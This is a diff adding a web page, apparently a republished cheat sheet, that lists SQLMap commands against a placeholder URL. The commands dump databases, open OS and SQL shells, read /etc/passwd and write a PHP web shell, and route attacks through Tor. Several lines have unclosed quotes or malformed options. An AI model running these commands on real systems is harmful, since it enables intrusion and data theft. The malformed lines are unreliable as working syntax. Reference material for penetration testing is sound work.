@@ -1,0 +1,83 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>SQLMap — PIXN</title>
+  <meta name="description" content="SQLMap — Working notes and command references for security tooling.">
+  <meta property="og:title" content="SQLMap — PIXN"><meta property="og:description" content="SQLMap — Working notes and command references for security tooling."><meta property="og:image" content="https://whgusals84.github.io/pixn-security/og.png"><meta name="twitter:card" content="summary_large_image">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+  <header data-site-header data-active="reference"></header>
+  <main class="page article-page" id="main">
+    <header class="article-heading">
+      <p class="eyebrow"><a href="/reference/">Reference</a> / <a href="/reference/tool/">Security Tools</a></p>
+      <h1>SQLMap</h1>
+      <time datetime="2021-08-16">AUGUST 16, 2021</time>
+    </header>
+    <article class="article-body"><h2 id="installation">Installation</h2>
+<p>Macos</p>
+<pre><code>brew install sqlmap
+</code></pre>
+<p>Linux</p>
+<pre><code>sudo apt install sqlmap
+</code></pre>
+<h2 id="go-to-commands">Go-to Commands</h2>
+<pre><code>sqlmap -u &quot;https://google.com/?q=1&quot; --dbs --no-cast --random-agent
+</code></pre>
+<h2 id="get-data">Get data</h2>
+<h3 id="all-databases">All databases</h3>
+<pre><code>sqlmap -u &quot;https://google.com/?q=1 --dbs
+</code></pre>
+<h3 id="all-tables-in-db">All tables in db</h3>
+<pre><code>sqlmap -u &quot;https://google.com/?q=1 --tables -D &quot;DB-NAME&quot;
+</code></pre>
+<h3 id="all-columns-in-table">All columns in table</h3>
+<pre><code>sqlmap -u &quot;https://google.com/?q=1 -D &quot;DB-NAME&quot; -T &quot;TABLE-NAME&quot; -columns
+</code></pre>
+<h3 id="dumped-contents">Dumped contents</h3>
+<pre><code>sqlmap -u &quot;https://google.com/?q=1 -D &quot;DB-NAME&quot; -T &quot;TABLE-NAME&quot; -dump
+</code></pre>
+<h2 id="get-shell">Get Shell</h2>
+<h3 id="get-os-shell">Get OS Shell</h3>
+<pre><code>sqlmap -u &quot;https://google.com/?q=1 --os-shell
+</code></pre>
+<h3 id="get-sql-shell">Get SQL Shell</h3>
+<pre><code>sqlmap -u &quot;https://google.com/?q=1 --sql-shell
+</code></pre>
+<h2 id="file">File</h2>
+<h3 id="read-file">Read File</h3>
+<pre><code>sqlmap -u &quot;https://google.com/?q=1&quot; --file-read '/etc/passwd'
+</code></pre>
+<h3 id="write-file">Write File</h3>
+<pre><code>sqlmap -u &quot;https://google.com/?q=1&quot; --file-write './shell.php' --file-dest '/apache/public/shell.php'
+</code></pre>
+<h2 id="with-tor">With Tor</h2>
+<pre><code>sqlmap -u &quot;https://google.com/?q=1&quot; --tor --tor-type=SOCKS5
+</code></pre>
+<h2 id="scanning-to-x">Scanning to X</h2>
+<h3 id="scanning-to-selected-param">Scanning to selected param</h3>
+<pre><code>sqlmap -u &quot;https://google.com/?q=1&amp;b=1&quot; -p q
+</code></pre>
+<h3 id="scanning-to-selected-cookie">Scanning to selected cookie</h3>
+<pre><code> $ sqlmap -u &quot;https://google.com/?q=1 \
+ --cookie &quot;abcd=1234; xcccc=1234; bgdfg=124&quot; \
+ -p abcd \
+ --param-filter='COOKIE' \
+ --level 2
+</code></pre>
+<p>조건</p>
+<ul>
+<li><code>--param-filter=COOKIE</code> 옵션 지정 필요</li>
+<li><code>-p</code> 옵션으로 원하는 쿠키 파라미터 지정</li>
+</ul>
+<ul>
+<li>2 이상의 level 지정 (level&gt;=2)</li>
+</ul></article>
+    <footer class="article-source"><span>Republished with permission</span><a href="https://www.hahwul.com/cullinan/tool/sqlmap/" rel="noopener noreferrer">Original source ↗</a></footer>
+  </main>
+  <footer data-site-footer></footer><script src="/assets/site.js"></script>
+</body>
+</html>
